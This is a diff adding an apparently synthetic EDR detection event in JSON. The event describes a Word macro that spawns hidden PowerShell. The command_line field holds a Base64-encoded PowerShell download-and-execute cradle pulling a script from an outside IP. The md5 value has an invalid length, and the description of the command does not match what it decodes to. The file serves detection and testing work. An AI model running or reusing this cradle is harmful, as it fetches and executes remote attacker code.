@@ -1,0 +1,73 @@
+{
+  "metadata": {
+    "customerIDHash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
+    "offset": 14256,
+    "eventType": "DetectionSummaryEvent",
+    "eventCreationTime": "2026-03-20T14:23:41Z",
+    "version": "1.0"
+  },
+  "detection": {
+    "detection_id": "ldt:a1b2c3d4e5f6:284736451829",
+    "technique_id": "T1059.001",
+    "technique_name": "PowerShell",
+    "tactic": "Execution",
+    "severity": "Critical",
+    "max_severity_displayname": "Critical",
+    "confidence": 95,
+    "description": "A PowerShell process was launched with an encoded command from a Microsoft Word document. The encoded command decodes to a script that establishes a reverse shell to an external IP address. This behavior is consistent with MITRE ATT&CK technique T1059.001 (Command and Scripting Interpreter: PowerShell).",
+    "device": {
+      "device_id": "a1b2c3d4e5f6a1b2c3d4e5f6",
+      "hostname": "WKSTN-042",
+      "local_ip": "10.128.4.42",
+      "external_ip": "203.0.113.52",
+      "os_version": "Windows 10 Enterprise 22H2",
+      "platform_name": "Windows",
+      "machine_domain": "ACMECORP",
+      "ou": "OU=Workstations,OU=Finance,DC=acmecorp,DC=com"
+    },
+    "user_name": "jsmith",
+    "user_id": "S-1-5-21-3623811015-3361044348-30300820-1013",
+    "process_name": "powershell.exe",
+    "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADIALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA",
+    "parent_process_name": "WINWORD.EXE",
+    "parent_process_id": "4812",
+    "parent_command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jsmith\\Downloads\\Q4-Financial-Review-2026.docm\"",
+    "grandparent_process_name": "explorer.exe",
+    "sha256": "a3f2d4e6b8c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f1a2b4c6d8e0f2a4b6c891",
+    "md5": "b4c5d6e7f8a9b0c1d2e3f4a5",
+    "behaviors": [
+      {
+        "behavior_id": "1",
+        "technique": "T1059.001",
+        "tactic": "execution",
+        "description": "PowerShell with encoded command launched from Office application",
+        "severity": 95,
+        "confidence": 95
+      },
+      {
+        "behavior_id": "2",
+        "technique": "T1071.001",
+        "tactic": "command-and-control",
+        "description": "HTTPS connection to suspicious external IP",
+        "severity": 90,
+        "confidence": 85
+      },
+      {
+        "behavior_id": "3",
+        "technique": "T1053.005",
+        "tactic": "persistence",
+        "description": "Scheduled task created for persistence",
+        "severity": 80,
+        "confidence": 90
+      }
+    ],
+    "ioc_values": [
+      "185.220.101.42",
+      "a3f2d4e6b8c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f1a2b4c6d8e0f2a4b6c891"
+    ],
+    "quarantined_files": [],
+    "created_timestamp": "2026-03-20T14:23:41Z",
+    "updated_timestamp": "2026-03-20T14:23:41Z"
+  }
+}
